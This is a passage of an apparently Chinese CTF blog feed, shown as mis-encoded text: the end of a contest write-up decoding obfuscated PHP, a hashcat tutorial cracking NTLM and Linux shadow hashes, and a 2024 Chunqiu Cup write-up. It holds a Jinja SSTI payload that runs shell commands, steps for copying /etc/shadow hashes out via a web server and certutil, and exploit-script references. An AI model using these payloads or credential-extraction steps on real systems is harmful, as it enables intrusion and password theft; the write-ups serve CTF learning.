class="line">$r=array(&quot;SaoCUFRXAGExNS5kaQ==&quot;,&quot;SaoCUVRSBofUNDFgR2Uu&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRrc9bISccd6uGcFpPn2+SG9tH+7+XJwpKq8/aR9NzkJPli0iCXWcWrDqCfM/ebpr7pkrFYT45Rzd4EgBetan+Vk6Bpw40QjtpcuHS4BY1JWWkcGXWoZCFp1wO20Y+kx7e7l+VSwDDJr7hC75YdT18DGMt8BpdLXxfsKUwFTt9dxcRc84dO65fl+JwoEaVSJo6psvA/7BQNuEHa8V8V2/2ekcK2DJUBNXhUA+FtVYWh9e09r24fBJ+MAN5cGYbIY/TqOrzwr3Gn9+Y9vPGke3VobnQcgMjZ07P4e&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;Sap6KU+uuy3+Gn+oqy3SgTM2GBxmng==&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapC0+gVG0z5/30rTq37qxq4GK1KbBlNfJ+1VoCpeyTdVAHewkwIQg0KDcNeR4REFocJJk1HBl0qNk7deBc=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRocex13UHArABWxOndUQ9OgshQjxynrZlCq/6T5cu61Krv/IHD3+b2orH9lOVptWeGII4RxOXL8430BAdncvckuSSO0sLezOyQtVRZDXEBUIN0WNIiXiPDjTSEHYr27l+n0o2bkLikF+AhTDZWmqPLwPjZQDwG2XfWAkgPXY1EUbDC4bYsoIhZp4dXo5aotJl8EN2fSNHw/A6OAF3bAzSZ0VwBTYY5PCI1JO6H3dvTFKjQH1eUHgFG2VQRT5weB1TK8SJbDV7ljYnci/EA=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;Sapk9b8P9VQl8+6WNSyPLHPzvij/ylGSUNpA5t/uHJmJm+BTi7aP7VLJygt/d3FEQUimFkyDmbL8mFAVMhgF+1Gs7oBe4PQqwN9d2TrCgLfYKoAmZ0Urg7pPrwOnlrE0kk7EkRo4ixqPCo6yK130dz4vGutEl+3+73+xeqIlSVX5Yto45yKnaJCMGyqoTnnS8wwwP+8n50+ZdAM4qvo/mRr+y5ip4DufES6xa2CtH70/I8loiokseAeG7uOO/6knTkKXYtT3jYy4nkA9pBHV16zWEk9K4rbAYxUP7Wg5VjiTuQIOXn7obn8BiHrv0F7qr/0wsTDNvohMh/nDE48kg7Q6aOF9LRLGw3q0CC9v7TJ1ESDAK+/EDa1VVxZ2NFhCau/sJPDj7RIoyYcQM6DngEBgUAdYZHmZ1JaIgRat0p2LPt0KBKwtw7whLX8IYbleQO+EAw6Z9xoxfeTrfg==&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SaoMNdkK9FQ96jqRfbz7Eb2ahw+iHTdlC4Jycu3Wc6NzHvj1CkDJnwN7Y0tlljncCpyGmLWKkJ8P9vn7+LMgkb6enEWqTEEo6SqEXMEx0hkif8i1ylrtYQMZtXrJOmPDJdFRbnFNkW5LpGJo7YkFXvcsKco+DEXDYbfwpfoOLwbRVOG7szZ2/62QRq1YgBUHQ3WMH6R9AKmA60x7lNTaxCR4own8gOMQQHihtK6txmaS+OFGZJXAN7voVNEJvBXvFOZdq3JAPdTCjmeAlrPcstZowZPuO43GbdE=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapC0+gVG0z5/30rTq37qxq4GK1KbBlNfJ+1VoCpeyTdVAHewkwIQg0KLWVSMCOW&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;Saq88Ykq5AQp8Y5Ku1nbYo0yjmWk/JdGMnvNM6SvX9LEE2xigxZnaBkevdBZ0SzjRJMK8tdPvGU8jCHt7GAH5H26TORj1sKJr5Kun5azyBfL7VycyFicwHpZ3dNlCfQKgmnXwXjqOUaEoQzUKr1Tl8I4triU1OQURapT0lulJK50NfNqPGAXJ8Xn1V2LYVm0G5XJRBNy/ReWo7ed+7l6s/MxHEyH6XMnfBeZdtpmA619VEnyc79tzVa40twaBUYtr6UaH3BnKkQN1shhZwzITAiwEK4xOJ1MO0nIRsvyXOCE5ABChBqc7g3tN79p7dZ6sjNZ2TQl4s7AtCOzyP2KBEXLE9lyrhwjV9N+n3uE3MfQvjChErcCmWNfuE7mcHq4W8XunjLiw4W5cHWaJiEzqDeza77m3+cPvHijF0HB52HNyEedxDbZOahxSuXnUmDO+k49fVa/s5h/wppFk/vjEHgg83Mo3zpAMsw5UqJTogEihVRbGDY5wUenU0nW70cdM45s3+wEA9a8VsDn2tgRPBnbNhtktiE3A7S+DH1fsV52Nf1V/sQbS5ssncWL/6EWJuwy42AK3I4s6lgzCT3An2Hf5rhfGXPpogKVGeIGexqRSrjv09hGwqBSeYJO8EHrI6IqWeFoDuYEI2jvP2DAM/+zri6Z8n2fsDkDeBbyYtFBHr7f2NqbL4AcTuszXn9pcqH238vIjZaPJBqbqvDTzeOsEYDc01cLkHk4rzqYoLQq9m7arE591m+q1sKHBsa0lcqqVpfpLjo7H0UzWt2uHlVNUjr96ijvXvNermcaEfhatwceGBGR64xGuZWAzN8o1I+V6469kyeG5pfE3uaDo0EcFlW7TdogYacKoMRTeOE0vcNibkNKaRj9CiAc/jrKrq+Nm30eYtpC5AZh38Cc85V6B2T3e16g4p1dJ9fgwWTSTbVQrv2zsJEp4QgFoyiuYrPIV62Lx++LhGsiVMyRnCh4deY5WX8vBuZOfC5Nhg==&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRrc9bISccd6uGcFpPn2+SG9tH+7+XJwpKq8/aR9NzkJPli0iCXWcWrDqCfM/ebpr7pkrFYT45Rzd4EgBetan+Vk6Bpw40QjtpcuHS4BY1JWWkcGXWoZCFp1wO20Y+kx7e7l+VSwDDJr7hC75YdT18DGMt8BpdLXxfsKUwFTt9dxcRc84dO65fl+JwoEaVSJo6psvA/7BQNuEHa8V8V2/2ekcK2DJUBNXhUA+FtVYWh9e09r24fBJ+MAN5cGYbIY/TqOrzwr3yn9OYyvPisf3VobnQcgMjZ13f4I&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;Sap6risomCodHP/PqrQaqvueeU+wURkueAeGLStP+bQE+HqsLq39zTQ2L1hsAA==&quot;);</span><br><span class="line">for ($i=0;$i&lt;count($r);$i++) &#123;</span><br><span class="line">    $decr=gzuncompress(x(base64_decode($r[$i]),$k));</span><br><span class="line">    print($decr);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250118153433654.png" alt="image-20250118153433654"></p><blockquote><p>flag{arsjxh-sjhxbr-3rdd78dfsh-3ndidjl}</p></blockquote>]]></content>
    
    
    <summary type="html">ğŸ¥§2024å¹´æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ›å†¬å­£èµ›wp-1.18</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="æ¯”èµ›wp" scheme="https://blog.m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>hashcatå¸¸è§„ä½¿ç”¨æ–¹æ³•</title>
    <link href="https://blog.m3x1.cn/posts/7ca0c84c.html"/>
    <id>https://blog.m3x1.cn/posts/7ca0c84c.html</id>
    <published>2025-01-16T16:00:00.000Z</published>
    <updated>2025-01-18T10:31:24.835Z</updated>
    
    <content type="html"><![CDATA[<h3 id="m-hashçš„ç±»å‹">-m hashçš„ç±»å‹</h3><p>æŒ‡å®šhashçš„åŠ å¯†ç±»å‹ï¼Œé»˜è®¤æ˜¯MD5ç±»å‹<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323151218880-546683178.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323151218880-546683178.png" alt="img"></a><br>åœ¨å¯¹åº”çš„ç±»å‹å‰é¢æœ‰å®ƒçš„id,å¯ä»¥é€šè¿‡idæ¥æŒ‡å®šç±»å‹<br>å½“æˆ‘ä»¬æƒ³è¦æ‰¾ä¸€ä¸ªç±»å‹åœ¨<code>hashcat</code>æ”¯ä¸æ”¯æŒçš„æ—¶å€™ï¼Œä¾‹å¦‚windowsç³»ç»ŸåŠ å¯†çš„æ˜¯NTML,å¯ä»¥æ‰§è¡Œå‘½ä»¤<br><code>hashcat64.exe -h | findstr NTLM</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323151441885-831306097.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323151441885-831306097.png" alt="img"></a><br>å¯ä»¥çœ‹åˆ°<code>NTLM</code>çš„IDå·ä¸º<code>1000</code></p><h3 id="a-æ”»å‡»æ–¹å¼">-a æ”»å‡»æ–¹å¼</h3><p>ç ´è§£å¯†ç çš„æ–¹å¼<br>åˆ†åˆ«æœ‰:</p><p>highlighter- 1c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0 | Straight  å­—å…¸ç ´è§£</span><br><span class="line">1 | Combination  ç»„åˆç ´è§£</span><br><span class="line">3 | Brute-force  æ©ç ç ´è§£</span><br><span class="line">6 | Hybrid Wordlist + Mask  æ··åˆå­—å…¸ + æ©ç </span><br><span class="line">7 | Hybrid Mask + Wordlist  æ··åˆæ©ç  +  å­—å…¸</span><br></pre></td></tr></table></figure><p><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323150232206-1864847787.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323150232206-1864847787.png" alt="img"></a></p><h3 id="æ©ç ">æ©ç </h3><p>å½“æ²¡æœ‰å­—å…¸çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨æ©ç æŒ‡å®šå¯†ç çš„æ¯ä¸€ä½æ˜¯ä»€ä¹ˆç±»å‹çš„å­—ç¬¦ï¼Œé¦–å…ˆæˆ‘ä»¬çŸ¥é“å¯†ç æœ‰å¤šå°‘ä½<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323153207489-2145128247.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323153207489-2145128247.png" alt="img"></a><br>ä¾‹å¦‚:<code>?d?d?d?d?d?d?d?d</code>ä»£è¡¨å¯†ç ä¸º8ä¸ºæ•°å­—ï¼Œ<code>?u?l?l?l?l?d?d?d</code>ä»£è¡¨å¯†ç ä¸º7ä½ï¼Œé¦–ä¸ªå­—æ¯å¤§å†™ï¼Œç„¶åå››ä¸ªå°å†™å­—æ¯ï¼Œæœ€åä¸‰ä¸ªæ•°å­—</p><h3 id="ç ´è§£windows-hashå¯†ç ">ç ´è§£windows hashå¯†ç </h3><p><strong>ä½¿ç”¨å­—å…¸çˆ†ç ´windows hash</strong><br><code>hashcat64.exe -a 0 -m 1000 hashæˆ–è€…hashfile å­—å…¸æ–‡ä»¶</code><br>å‡†å¤‡å¥½æˆ‘ä»¬çš„å¯†ç æœ¬ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯æ‰‹å†™çš„<code>2.txt</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323152446755-1468474769.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323152446755-1468474769.png" alt="img"></a><br><code>hashcat64.exe -a 0 -m 1000 e45a314c664d40a227f9540121d1a29d 2.txt</code><br>æ‰§è¡Œåä¼šè¿›å…¥è¿™æ ·ä¸€ä¸ªçŠ¶æ€ï¼Œè¿™é‡Œæ¯ä¸ªå¯èƒ½ä¸ä¸€æ ·ï¼Œåœ¨ç ´è§£æˆåŠŸæˆ–è€…è·‘å®Œå­—å…¸åä¼šè‡ªåŠ¨åœæ­¢<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323152907726-1543846375.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323152907726-1543846375.png" alt="img"></a><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323152938264-999245190.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323152938264-999245190.png" alt="img"></a><br>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„å¯†ç å·²ç»è¢«ç ´è§£å‡ºæ¥ï¼Œä¸º<code>Admin123</code><br>åœ¨ç ´è§£åï¼Œä¼šåœ¨æ ¹ç›®å½•ä¸‹çš„<code>hashcat.potfile</code>æ–‡ä»¶è®°å½•è¿™ä¸ªhashçš„ç¼“å­˜<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323154735555-892319052.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323154735555-892319052.png" alt="img"></a></p><p><strong>ä½¿ç”¨æ©ç ç ´è§£windows hash</strong><br><code>hashcat64.exe -a 3 -m 1000 e45a314c664d40a227f9540121d1a29d ?u?l?l?l?l?d?d?d</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323155148658-906395823.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323155148658-906395823.png" alt="img"></a><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323155209806-1669173198.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323155209806-1669173198.png" alt="img"></a><br>ç ´è§£æˆåŠŸ</p><p>åœ¨æˆ‘ä»¬çˆ†ç ´çš„åŒæ—¶ï¼Œä¼šæœ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt;</span><br></pre></td></tr></table></figure><p>åˆ†åˆ«ï¼šæŸ¥çœ‹ç ´è§£çŠ¶æ€ï¼Œæš‚åœï¼Œç»•è¿‡ï¼Œæ£€æŸ¥ï¼Œé€€å‡º</p><p>è¿˜æœ‰å¦‚ä¸‹ä¾‹å­ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250118140015954.png" alt="image-20250118140015954"></p><h3 id="ç ´è§£Linux-hashå¯†ç ">ç ´è§£Linux hashå¯†ç </h3><p>åœ¨<code>linux</code>ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œå¯†ç åˆ†åˆ«å­˜å‚¨åœ¨/etc/passwdå’Œ/etc/shadowä¸­ï¼Œåªéœ€è¦<code>more /etc/shadow</code>ï¼Œå°†å…¶ä¸­çš„æ–‡ä»¶å¤åˆ¶å‡ºæ¥ï¼Œä½¿ç”¨å·¥å…·ç ´è§£å³å¯<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323193627170-854468310.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323193627170-854468310.png" alt="img"></a><br>å°†rootå’Œjacksonç”¨æˆ·çš„å¯†ç ä¿å­˜åˆ°<code>/var/www/html/pass</code>WebæœåŠ¡ç›®å½•ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$6$90/diajJs2fHcIGa$hB5wj4tMF8Qdd6o5VNRTY4v4vEpV8x0NP4O1N/tpJ8ns7JmJ8RyvSih7.W8TQdfwweUFh16dJejFpKw07i2uR1::0:99999:7:::</span><br><span class="line">jackson:$6$Zje1WaoS$eH24JFr5n67149yBcDWWsfxME5cYlOXMmJxnf2uinbvYm8vWc0BmjvAoXIFY/0ZUJItRpPhHkCGDiqjXT10EV0:19066:0:99999:7:::</span><br></pre></td></tr></table></figure><p><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220324083051894-306061497.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220324083051894-306061497.png" alt="img"></a><br>æ³¨æ„è¿™é‡Œçš„æ¢è¡Œï¼Œä¸€ä¸ªç”¨æˆ·çš„hashå€¼æ˜¯ä¸€è¡Œ<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323195519376-1688604181.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323195519376-1688604181.png" alt="img"></a><br>å¯åŠ¨WebæœåŠ¡<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323195250088-790012495.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323195250088-790012495.png" alt="img"></a><br>å¹¶åœ¨å®éªŒæœºå™¨ä¸‹è½½ï¼Œè¿™é‡Œä½¿ç”¨certutilå°†passæ–‡ä»¶å†…å®¹ä¸‹è½½åˆ°äº†Dç›˜ä¸‹çš„passæ–‡ä»¶ä¸­å»<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323194800417-621412828.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323194800417-621412828.png" alt="img"></a><br><strong>Linuxä½¿ç”¨çš„æ˜¯ sha512cryptåŠ å¯†æ–¹å¼</strong>ï¼Œåœ¨hashcatä¸­å¯»æ‰¾æ˜¯å¦æœ‰è¯¥æ–¹æ³•<br><code>hashcat64.exe -h|findstr sha512crypt</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323195736516-1164859720.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323195736516-1164859720.png" alt="img"></a><br>ä»£å·ä¸º<code>1800</code><br>ç»§ç»­ä½¿ç”¨æˆ‘ä»¬çš„<code>2.txt</code>å¯¹<code>d:\pass</code>æ–‡ä»¶è¿›è¡Œæš´åŠ›ç ´è§£<br><code>hashcat64.exe -a 0 -m 1800 d:\pass 2.txt</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323200929852-624191296.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323200929852-624191296.png" alt="img"></a><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323201016538-1015617615.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323201016538-1015617615.png" alt="img"></a><br>è¿™é‡Œæˆ‘æ›´æ¢äº†<code>root</code>å’Œ<code>jackson</code>ç”¨æˆ·åœ¨æ–‡ä»¶ä¸­çš„ä½ç½®<br>çˆ†ç ´æˆåŠŸï¼Œå¾—åˆ°<code>jackson</code>çš„å¯†ç ä¸º<code>root</code>ï¼Œä½†æ˜¯åªçˆ†ç ´å‡ºäº†ä¸€ä¸ªå¯†ç ï¼Œåº”è¯¥åªæ”¯æŒä¸€ä¸ªå¯†ç çš„ç ´è§£<br><strong><code>æ³¨æ„:å¤åˆ¶çš„æ—¶å€™ä¸€å®šä¸è¦æœ‰æ¢è¡Œï¼Œä¸ç„¶æ˜¯æ— æ³•ç ´è§£æˆåŠŸçš„</code></strong></p>]]></content>
    
    
    <summary type="html">ğŸ¥§hashcatå¸¸è§„ä½¿ç”¨æ–¹æ³•</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="webå§¿åŠ¿" scheme="https://blog.m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>2024å¹´æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ›å†¬å­£èµ›wp-1.17</title>
    <link href="https://blog.m3x1.cn/posts/b245cfb0.html"/>
    <id>https://blog.m3x1.cn/posts/b245cfb0.html</id>
    <published>2025-01-16T16:00:00.000Z</published>
    <updated>2025-02-19T11:00:12.845Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web">web</h2><h4 id="easy-flask">easy_flask</h4><blockquote><p>è€ƒç‚¹ï¼šssti æ³¨å…¥</p></blockquote><p>æ‰“å¼€ç½‘é¡µï¼Œå‘ç°æœ‰ä¸ªç™»å½•ï¼Œè¯•è¯•ç›´æ¥ç™»å½•</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165333225.png" alt="image-20250117165333225"></p><p>çœ‹åˆ° url å¤„æ˜¯è¿›è¡Œ get ä¼ å‚ï¼Œè¯•è¯• 111</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165407490.png" alt="image-20250117165407490"></p><p>è”æƒ³åˆ° ssti æ¼æ´ï¼Œäºæ˜¯ç”¨9éªŒè¯ä¸€ä¸‹ï¼Œå‘ç°å°±æ˜¯ ssti æ¨¡æ¿æ³¨å…¥</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165456193.png" alt="image-20250117165456193"></p><p>è¿›è¡Œ ssti æ¨¡æ¿æ³¨å…¥æ¼æ´ä¸€ç³»åˆ—ï¼Œæ„é€  payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;cycler.next.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165555735.png" alt="image-20250117165555735"></p><blockquote><p>flag{48ad0cde8345c8b2608933ac4e85147e}</p></blockquote><h4 id="file-copy">file_copy</h4><blockquote><p>è€ƒç‚¹ï¼šæ— å›æ˜¾ï¼Œfilteråè®®</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117230203872.png" alt="image-20250117230203872"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117230233073.png" alt="image-20250117230233073"></p><p>æ ¹æ®ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯postä¼ å‚ï¼Œå‚æ•°æ˜¯pathã€‚ï¼ˆæŠ“åŒ…ä¹Ÿå¯ä»¥çœ‹ï¼‰</p><p>ç›´æ¥ä½¿ç”¨è„šæœ¬ï¼ˆ<a href="https://github.com/ProbiusOfficial/PHPinclude-labs/tree/bbb08b030623d481be51edea063433b8d77b2ee7/Level%2017/php_filter_chains_oracle_exploit-main%EF%BC%89">https://github.com/ProbiusOfficial/PHPinclude-labs/tree/bbb08b030623d481be51edea063433b8d77b2ee7/Level 17/php_filter_chains_oracle_exploit-mainï¼‰</a></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117230452787.png" alt="image-20250117230452787"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117230507242.png" alt="image-20250117230507242"></p><blockquote><p>flag{894272cc-8e8d-47f7-9565-39636508492a}</p></blockquote><h2 id="Misc">Misc</h2><h4 id="ç®€å•ç®—æ•°">ç®€å•ç®—æ•°</h4><p>è€ƒç‚¹ï¼šå¼‚æˆ–</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165811554.png" alt="image-20250117165811554"></p><p>ç›´æ¥è¿›è¡Œå­—ç¬¦ä¸²å¼‚æˆ–ï¼Œå¾—åˆ° flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165855506.png" alt="image-20250117165855506"></p><blockquote><p>flag{x0r_Brute_is_easy!}</p></blockquote><h4 id="See-anything-in-these-pics">See anything in these pics</h4><blockquote><p>è€ƒç‚¹ï¼šæ–‡ä»¶åˆ†ç¦»</p></blockquote><p>è§£å‹åæ˜¯ä¸€ä¸ªäºŒç»´ç å’Œä¸€ä¸ªå‹ç¼©åŒ…</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170037763.png" alt="image-20250117170037763"></p><p>æ‰«æäºŒç»´ç ï¼Œå¾—åˆ°è§£å‹ç¼©åŒ…çš„å¯†ç </p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170129000.png" alt="image-20250117170129000"></p><p>è§£å‹åå¾—åˆ°ä¸€å¼  jpg å›¾ç‰‡ã€‚å…ˆæ”¾è¿› 010editor çœ‹ä¸€ä¸‹ï¼Œå‘ç°éšè—äº†æ–‡ä»¶</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170256270.png" alt="image-20250117170256270"></p><p>ç”¨ binwalk æ¢æµ‹ï¼Œç„¶åæå–ï¼Œå¾—åˆ°ä¸€å¼  png å›¾ç‰‡</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170348138.png" alt="image-20250117170348138"></p><p>æ”¾è¿› 010editor æŸ¥çœ‹ï¼Œå¯èƒ½å®½é«˜è¢«ä¿®æ”¹è¿‡ï¼Œäºæ˜¯ä¿®æ”¹å®½é«˜å¾—åˆ°åŸå›¾</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170548575.png" alt="image-20250117170548575"></p><blockquote><p>flag{opium_00pium}</p></blockquote><h4 id="ç®€å•æå–é•œåƒ">ç®€å•æå–é•œåƒ</h4><blockquote><p>è€ƒç‚¹ï¼šæµé‡åˆ†æï¼Œæ•°æ®ä¿®å¤</p></blockquote><p>è§£å‹æ–‡ä»¶å¾—åˆ°ä¸€ä¸ªæµé‡åŒ…ï¼Œè¿›è¡Œæµé‡åˆ†æï¼Œå¯¼å‡ºæ–‡ä»¶ï¼Œå¾—åˆ°ä¸€ä¸ª zip æ–‡ä»¶</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117171207275.png" alt="image-20250117171207275"></p><p>è§£å‹ zip æ–‡ä»¶ï¼Œå¾—åˆ°ä¸€ä¸ªç ´æŸçš„ img æ–‡ä»¶ï¼Œæ ¹æ®æç¤ºï¼Œå¯èƒ½å¯ä»¥ä½¿ç”¨ RR-Studio å·¥å…·ä¿®å¤ã€‚</p><p>å¯ä»¥ç›´æ¥è¿›è¡Œæ–‡ä»¶åˆ†ç¦»ï¼Œå¾—åˆ°ä¸€ä¸ª excl è¡¨æ ¼ï¼Œå¾—åˆ° flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117171347734.png" alt="image-20250117171347734"></p><blockquote><p>flag{E7A10C15E26AA5750070EF756AAA1F7C}</p></blockquote><h4 id="å‹åŠ›å¤§ï¼Œå†™ä¸ªè„šæœ¬å§">å‹åŠ›å¤§ï¼Œå†™ä¸ªè„šæœ¬å§</h4><blockquote><p>è€ƒç‚¹ï¼šè„šæœ¬ç¼–å†™èƒ½åŠ›</p></blockquote><p><img src="E:/%E5%B7%A5%E7%A8%8B%E5%AE%9E%E8%B7%B5/%E5%B7%A5%E5%85%B7/typora/Typora/upload/image-20250117171504745.png" alt="image-20250117171504745"></p><p>å¾ˆæ˜æ˜¾æ˜¯æœ‰å¯†ç çš„å¥—å¨ƒå‹ç¼©åŒ…ï¼Œç›´æ¥ç¼–å†™è„šæœ¬è§£å¯†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import base64</span><br><span class="line">for i in range(99,0,-1):</span><br><span class="line">    i=str(i)</span><br><span class="line">    zipname = &quot;C:\\Users\\Lucky\\Desktop\\æ˜¥ç§‹æ¯\\misc\\å‹åŠ›å¤§ï¼Œå†™ä¸ªè„šæœ¬å§\\zip_&quot;+i+&quot;.zip&quot;</span><br><span class="line">    passwd_path = &quot;C:\\Users\\Lucky\\Desktop\\æ˜¥ç§‹æ¯\\misc\\å‹åŠ›å¤§ï¼Œå†™ä¸ªè„šæœ¬å§\\password_&quot;+i+&quot;.txt&quot;</span><br><span class="line">    passwd = open(passwd_path, &quot;r&quot;).read()</span><br><span class="line">    passwd = base64.b64decode(passwd)</span><br><span class="line">    print(passwd)</span><br><span class="line">    ts1 = zipfile.ZipFile(zipname,&#x27;r&#x27;)</span><br><span class="line">    ts1.extractall(r&quot;C:\\Users\\Lucky\\Desktop\\æ˜¥ç§‹æ¯\\misc\\å‹åŠ›å¤§ï¼Œå†™ä¸ªè„šæœ¬å§&quot;,pwd=passwd)</span><br><span class="line">    ts1.close()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117171704899.png" alt="image-20250117171704899"></p><p>æç¤ºæ˜¯ pngï¼Œç„¶åæˆ‘ä»¬å°† password_0.txt çš„å¯†ç è¿›è¡Œ base64 è§£å¯†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">89504E470D0A1A0A0000000D494844520000019000000190</span><br></pre></td></tr></table></figure><p>å‘ç°æ˜¯ä¸ª png 